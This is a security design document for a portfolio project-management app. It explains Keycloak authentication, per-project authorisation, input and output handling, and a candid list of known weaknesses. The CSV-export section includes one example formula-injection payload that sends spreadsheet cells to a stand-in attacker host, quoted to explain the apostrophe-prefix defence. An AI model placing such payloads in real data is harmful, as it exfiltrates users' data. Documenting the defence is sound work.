# Security

This document describes how Visual Project Manager handles identity,
authorisation and untrusted input — and, at the end, what it does not
handle. The second list matters more than the first. A security document
that only lists strengths is a marketing page.

**Status:** this is a portfolio project. It runs against a local
development stack and has never held anybody's real data. Several
decisions below are correct for that setting and would need revisiting
before it held anybody else's — each one says so where it applies.

---

## Reporting something

If you find a vulnerability, open a
[GitHub issue](https://github.com/ghiacciolodev/Visual-Project-Manager/issues)
describing it. Given what this project is, there is no embargo process and
nothing to coordinate: there are no deployments and no users to protect.

---

## The shape of it

Two systems, and the split between them is the main design decision.

**Keycloak establishes who you are.** It owns passwords, registration,
password reset, brute-force lockout and the tokens. The application never
sees a password, has no login form of its own, and has no code that could
leak one.

**The application decides what you may do.** Project membership and roles
live in its own database, not in the token.

Putting roles in the token was the obvious alternative and it is worse
here. Membership changes far more often than identity does, and a token
carrying `role: OWNER` stays valid until it expires — so removing somebody
from a project would leave them able to administer it for up to fifteen
minutes. It also means every membership change forces a token refresh, and
scales the token with the number of projects a person belongs to.

```
Keycloak                          Application
────────                          ───────────
who you are          ─ token ─▶   which projects you are in
passwords                         what your role is in each one
sessions                          whether this action is allowed
lockout
```

---

## Authentication

**OpenID Connect, Authorization Code with PKCE.** The Angular client is a
public client with no secret, because a secret in a browser bundle is
readable by anyone who opens the developer tools — it is not a secret, it
is a string. PKCE replaces it with a per-request proof that only the tab
which started the flow can produce.

**The issuer is checked, not just the signature.** The backend addresses
Keycloak by two URLs: it fetches signing keys over the compose network
(`http://keycloak:8080`) and validates the `iss` claim against the public
address the browser used (`http://localhost:8081`). Validating against the
internal address would reject every real token; skipping the check
entirely would accept tokens minted by *any* realm on that server. See
`SecurityConfig.jwtDecoder`.

**A token with no `sub` claim is rejected outright.** Not defensive
padding — Spring Data turns a null parameter into `WHERE keycloak_sub IS
NULL`, which matches every not-yet-linked row. A token without a subject
would silently adopt somebody else's account, and the next one would adopt
it in turn. `CurrentUser.require()` throws instead.

**Access tokens last fifteen minutes** and are renewed silently in the
background from a refresh token. A rejected token sends the person back to
Keycloak rather than showing them an error they cannot act on.

**The Authorization header is attached by URL, not to everything.** The
interceptor adds it only to requests aimed at this application's own API.
An interceptor that added it unconditionally would also send the access
token to Keycloak's token endpoint and to any third-party service the app
later talked to.

---

## Authorisation

Every rule is enforced on the **service** layer, one step closer to the
data than the controller, so it still applies if a second controller, a
scheduled job or a test calls in.

```java
@PreAuthorize("@access.canEdit(#projectId)")
public TaskResponse update(Long projectId, Long id, TaskRequest request)
```

| Role     | Read the plan | Change the plan | Rename, delete, manage people |
|----------|:-------------:|:---------------:|:-----------------------------:|
| `OWNER`  | ✓             | ✓               | ✓                             |
| `EDITOR` | ✓             | ✓               | —                             |
| `VIEWER` | ✓             | —               | —                             |

Anyone may remove **themselves** from a project regardless of role — see
`ProjectAccess.canRemoveMember`. A project cannot be left without an
owner, which is refused for departures and demotions alike.

### 404 for strangers, 403 for members

A non-member asking for project 7 gets `404 Not Found`, not `403
Forbidden`. A 403 confirms that project 7 exists, and an id that answers
differently for members and strangers is an enumeration oracle: walk the
integers and you learn how many projects the system holds and which ids
are live.

A **member** who lacks the role for an action does get a 403, with the
reason. They already know the project exists — hiding why the button did
nothing would only leave them guessing.

### Insecure direct object references

Every task lookup is by id **and** project:

```java
repository.findByIdAndProjectIdAndDeletedAtIsNull(id, projectId)
```

A task id guessed from another project does not resolve, and the caller
learns nothing about whether it exists elsewhere. The same pairing means a
dependency edge can never be made to reach across into another plan.

Assignment is checked the same way. `assignee_id` accepts only a user who
is a member of that project — otherwise the column would be a way to
attach a stranger's account to your plan, and their name would then be
read back out of the task list by everybody in it. The schema cannot
express that rule: its foreign key says "some user", and what is needed is
"a member of this project".

---

## Input

**Bean Validation on the DTO, CHECK constraints in the schema.** Both, on
purpose: the annotations turn bad input into a readable 400, and the
constraints are the line nobody can bypass — not an application bug, not a
manual `INSERT`, not a future second writer.

**Colour is matched against `^#[0-9A-Fa-f]{6}$`** before it is stored. That
value ends up in an inline `style` attribute on the Gantt bars, so it is
the one field where unvalidated input would reach a rendering context
directly.

**Mass assignment is prevented by the shape of the DTO.** `TaskRequest`
has no `id`, no `projectId` and no timestamps. There is no binder to
configure and no field to forget to exclude, because the fields do not
exist.

**Angular escapes interpolated values by default,** and this application
never uses `bypassSecurityTrustHtml` or `innerHTML`.

---

## Output

Errors are RFC 9457 Problem Details, in one shape across the whole API,
including the 429 that a servlet filter writes by hand because a filter
never reaches the exception handler.

Stack traces, exception messages and SQL fragments do not reach clients:

```yaml
server.error.include-stacktrace: never
server.error.include-message: never
```

Actuator exposes `health` and nothing else. The other endpoints publish
configuration, beans and environment variables.

### CSV export, and formula injection

The CSV export is an output path with a genuine injection surface, and it is
worth being explicit about because it does not look like one.

A cell whose text begins with `=`, `+`, `-` or `@` is a **formula** to Excel,
Google Sheets and LibreOffice alike. So a task titled

```
=HYPERLINK("https://attacker.example/?d="&A1&A2,"Click for the report")
```

is inert everywhere in this application — Angular escapes it, the schedule
shows it as text — and becomes executable the moment somebody exports the plan
and opens the file. The route runs from data one project member can type to a
spreadsheet another member opens on their own machine, which is the part that
makes it worth defending rather than shrugging at.

`escapeCell` in `core/export.ts` prefixes any such value with an apostrophe,
the mitigation those three applications all understand as "the rest is text".
Numbers never pass through it, so a negative figure stays a number. RFC 4180
quoting is applied on top and separately: quoting alone is *not* a defence,
because a spreadsheet strips the CSV quoting before it decides what the cell
means.

The file is written in the browser from data the caller already has, so this
adds no new access — the concern is entirely about what happens to it after it
is saved. `export.spec.ts` pins all four prefixes.

---

## CSRF, CORS, rate limiting

**CSRF protection is off, deliberately.** The attack needs a credential
the browser attaches *automatically* — a cookie. This API authenticates
with a `Bearer` header that a cross-site form cannot set, so there is
nothing to forge. **If the client ever moves to cookie-based sessions,
this must come back on**, and the comment in `SecurityConfig` says so at
the point where it would be changed.

**CORS allows exactly one origin,** from configuration, defaulting to the
development frontend. Not a wildcard, and not reflected from the `Origin`
header.

**Writes are rate limited; reads are not.** A token bucket per caller, 120
writes a minute, refilling continuously. Reads cost a query and are what a
person does by having the page open — a limit low enough to stop abusive
reading would interrupt somebody switching between the schedule and the
chart. Writes are what grow the database and set dependency and
critical-path recalculation going.

Buckets are keyed by the token's **subject**, not by IP, so an office
behind one NAT address does not share a single allowance. Refill is greedy
rather than by interval: an interval refill lets a caller drain the bucket,
wait for the boundary and drain it again, which is twice the intended rate.

**Password brute force is Keycloak's job:** five failures, temporary
lockout, up to fifteen minutes, no permanent lockout (which is itself a
denial-of-service vector against a known username).

---

## Secrets

There are none in this repository.

`.env` and `.env.example` hold development values for containers listening
on localhost — `vpm_local_dev`, `admin`. They protect nothing that is
reachable from anywhere else, and the file says so. Real deployments would
take these from the platform's environment and from GitHub Secrets.

The Angular client has no secret to leak, by design (see PKCE above).

---

## Known weaknesses

These are real and unfixed. Several are the consequence of decisions taken
deliberately; all of them would need addressing before this held data that
mattered.

**1. Tokens live in `sessionStorage`, so they are reachable by injected
script.** This is the significant one. They are cleared when the tab
closes and are not shared between tabs, and the access token's fifteen
minutes bounds the damage — but any successful XSS reads both tokens.
The structural fix is a backend-for-frontend holding the refresh token in
an `httpOnly` cookie, which would also bring CSRF protection back into
scope. Out of scope here, and named as such in `auth.config.ts`.

**2. The optimistic-concurrency check is opt-in.** `expectedUpdatedAt` is
optional on `TaskRequest`. A client that omits it gets last-write-wins
with no warning. It is optional because requiring it would break every
existing caller at once and because unconditional writes are legitimate —
but it means the protection is a convention, not a guarantee. This
application always sends it.

**3. Rate-limit buckets are in memory, per instance.** Two instances
behind a load balancer mean two allowances. A restart forgives everybody.
Acceptable for a burst limit; it would not be for a quota. A shared store
(Redis, or Bucket4j's JDBC backend) is the fix.

**4. The Keycloak development stack is not hardened.** `start-dev`
disables HTTPS enforcement, the realm sets `sslRequired: none`, and the
bootstrap administrator is `admin`/`admin` from `docker-compose.yml`.
These are development settings; a deployment uses `start` with a
certificate and an administrator that is not in a file.

**5. Registration is open.** `registrationAllowed: true` on the realm, so
anybody who can reach the sign-in screen can create an account and create
projects. Correct for a demo people are invited to try; a real deployment
would restrict registration to an identity provider or an invitation.

**6. The demo seed writes directly to the database.** `scripts/demo/`
takes the Keycloak bootstrap admin and a database container name and
bypasses the API entirely — which is the only way to seed a history with
dates in the past, and also why it must never be pointed at anything real.

**7. The audit log is append-only by convention, not by grant.** Nothing
in the application deletes or updates a row in `audit_log`, and no
endpoint exposes a way to. But the application's database user is the
owner of the table and could. A real tamper-evident log needs either a
restricted grant or somewhere the application cannot write at all.

**8. Soft-deleted tasks are kept forever.** `deleted_at` is set and the row
stays, deliberately — it is what keeps dependency references and history
readable. There is no retention policy, and under GDPR "we keep it
indefinitely because it was convenient" is not one of the lawful bases.

**9. Four advisories in the dependency tree** — two moderate, two high, as
of the last `npm audit`. All four (`undici`, `hono`, `fast-uri`) arrive
through `@angular/build` and `@angular/cli`, which are `devDependencies`:
they are part of the build toolchain and none of them reaches the shipped
bundle. They are worth tracking and are not worth forcing a resolution
over, which would pin transitive versions the Angular CLI has not tested
against.

---

## What is deliberately not here

No secrets scanning, no SAST in CI, no dependency auto-update bot, no
signed commits, no SBOM. All four are reasonable things to add and none of
them was going to teach me anything about this application that reading it
would not. They are the first things I would add if it were going to be
deployed.
